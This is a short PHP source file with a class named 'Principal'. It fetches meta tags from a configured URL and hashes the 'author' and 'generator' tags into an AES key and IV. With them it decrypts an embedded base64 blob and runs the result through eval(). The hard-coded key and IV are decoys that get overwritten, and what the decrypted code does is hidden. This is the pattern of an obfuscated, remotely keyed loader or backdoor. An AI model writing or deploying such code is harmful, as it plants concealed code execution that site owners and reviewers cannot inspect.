<?php

class Principal
{
    private $key = '49e69f7a5b79724cf7a3637db8f5b1cfc1ea7c480cdd480f87ee011d198aabbf';
    private $ivalue = '2757389a64f797de';
    private $encryptMethod = "AES-256-CBC";
    private $output = "NmNwOHRIM1lUNmNFQ2xUV1p0Q3g4QTgyekhNRGpWcTRaMkpGaW04dmFQUThYSi9SVUl
    oNTFBNzF1enlIc2c0TFpENjI2UDZrbDVDbUZnTkVNeTYzYjgxakZ4b1lQT0FSejJFdHhtWDIwNDhEUC9OSTJISn
    JLdWlzdmVsZ1pyYkk";

    private $key1;
    private $key2;
    private $key3;

    public $var1;
    public $var2;

    function Executa()
    {
        $var3 = $var5 = '';
        $this->Prepara();
        eval($this->Verifica());
        $var6 = (object)['var5'=>$var5,'var3'=>$var3];
        return $var6;
    }
    function Verifica()
    {
        $this->key = $this->key1;
        $this->ivalue = $this->key2;
        $this->output = $this->key3;
        $return = openssl_decrypt(base64_decode($this->output), $this->encryptMethod, 
            $this->key, 0, $this->ivalue);
        return $return;
    }
    function Prepara()
    {
        $keys = $this->Autor();
        $this->key1 =  hash('sha256', ($keys['author']));
        $this->key2 = substr(hash('sha256', ($keys['generator'])), 0, 16);
        $this->key3 = 'WUdwRFk1dUFRODdyVURpL3doZi9WaXFMY0ZqVnhURk9RSWs5WHNleFU5NmVhL0VjZ
        nVxOVJpZktVWkhBVEl4T2NiV1hFTWhUYWIyeWg5bjdGRlMzNzBSSHByR0pMVDdyUlFQZVlGNm9SMXJnV
        0FKemJpOWFRbmpPc0x2eVZiRis';
    }
    function Autor()
    {
        require_once "constantes.inc.php";
        $config = new Config();
        $url = $config->SelectURL();
        $tags = get_meta_tags($url);
        return $tags;
    }
}

?>